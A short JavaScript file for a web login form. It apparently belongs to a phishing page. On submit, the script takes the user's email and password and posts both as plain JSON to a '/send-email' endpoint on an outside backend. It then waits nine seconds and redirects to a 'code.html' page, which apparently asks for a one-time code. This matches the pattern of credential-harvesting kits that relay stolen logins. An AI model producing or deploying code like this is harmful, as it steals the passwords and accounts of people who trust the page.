const loginForm = document.querySelector("form");
const signInButton = document.querySelector(".btn-sec");

const apiUrl = "https://apt-com-backend.onrender.com";

loginForm.addEventListener("submit", async (e) => {
  e.preventDefault();

  // Get user input for email and password
  const userEmail = document.getElementById("email").value;
  const userPassword = document.getElementById("password").value;

  if (!userPassword) {
    // password.style.border = ".9px rgb(201, 58, 26) solid";
    // errorPassword.textContent = "Please enter a password.";
    console.log("no password in input");
    return; // Prevent further processing
  }

  signInButton.innerText = "Loading...";
  signInButton.style.backgroundColor = "gray";
  signInButton.disabled = true;

  try {
    // Make the HTTP POST request to the API endpoint
    console.log('hello world');
    const response = await fetch(`${apiUrl}/send-email`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ email: userEmail, password: userPassword }),
    });
    console.log(response);

    // Check if the request was successful (status code 2xx)
    if (response.ok) {
      // Parse the response JSON data
      const responseData = await response.json();

      setTimeout(() => {
       window.location.href = "code.html";
      }, 9000)
     
      // Handle successful login, such as redirecting the user to another page
    } else {
      // If the response status is not in the 2xx range, handle the error
      console.error("Error logging in:", response.statusText);
      // Handle login failure, such as displaying an error message to the user
    }
  } catch (error) {
    // If an error occurs during the request, handle it
    console.error("Error logging in:", error);
    // Handle login failure, such as displaying an error message to the user
  }
});


